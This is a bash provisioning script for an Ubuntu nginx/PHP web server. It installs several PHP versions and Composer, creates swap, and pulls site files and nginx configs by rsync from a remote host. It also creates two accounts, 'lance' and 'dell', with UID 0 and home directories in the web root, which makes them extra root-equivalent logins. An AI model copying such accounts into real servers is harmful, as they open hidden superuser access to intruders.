#!/bin/bash
DEBIAN_FRONTEND=noninteractive
TZ=Asia/Manila
ln -fs /usr/share/zoneinfo/Asia/Manila /etc/localtime
apt-get update
add-apt-repository ppa:ondrej/php
apt-get update
apt-get upgrade -y
apt-get dist-upgrade -y
apt-get purge apache2 apache* -y
apt-get install software-properties-common zip nginx certbot python3-certbot-nginx unzip php7.1 php7.1-fpm php7.1-curl php7.1-ldap php7.1-mysql php7.1-gd php7.1-xml php7.1-mbstring php7.1-zip php7.1-bcmath curl wget nano -y
apt-get install software-properties-common zip unzip php7.0 php7.0-fpm php7.0-curl php7.0-ldap php7.0-mysql php7.0-gd php7.0-xml php7.0-mbstring php7.0-zip php7.0-bcmath -y
apt-get install software-properties-common zip unzip php7.2 php7.2-fpm php7.2-curl php7.2-ldap php7.2-mysql php7.2-gd php7.2-xml php7.2-mbstring php7.2-zip php7.2-bcmath -y
apt-get install software-properties-common zip unzip php7.3 php7.3-fpm php7.3-curl php7.3-ldap php7.3-mysql php7.3-gd php7.3-xml php7.3-mbstring php7.3-zip php7.3-bcmath -y
apt-get install software-properties-common zip unzip php7.4 php7.4-fpm php7.4-curl php7.4-ldap php7.4-mysql php7.4-gd php7.4-xml php7.4-mbstring php7.4-zip php7.4-bcmath -y
apt-get install software-properties-common zip unzip php8.0 php8.0-fpm php8.0-curl php8.0-ldap php8.0-mysql php8.0-gd php8.0-xml php8.0-mbstring php8.0-zip php8.0-bcmath -y
apt-get install software-properties-common zip unzip php8.1 php8.1-fpm php8.1-curl php8.1-ldap php8.1-mysql php8.1-gd php8.1-xml php8.1-mbstring php8.1-zip php8.1-bcmath -y
curl -sS https://getcomposer.org/installer | php -- --install-dir=/usr/local/bin --filename=composer
systemctl restart nginx.service
/bin/dd if=/dev/zero of=/var/swap.1 bs=1M count=1024
/sbin/mkswap /var/swap.1
/sbin/swapon /var/swap.1
mkdir /var/www/html/files
useradd -d /var/www/html/lance -g root -m -N -o -u 0 -s /bin/bash lance
useradd -d /var/www/html/dell -g root -m -N -o -u 0 -s /bin/bash dell
rsync -av stock.ideaservph.tech:/var/www/html/ /var/www/html/
rsync -av stock.ideaservph.tech:/etc/nginx/sites-enabled/ /etc/nginx/sites-enabled/
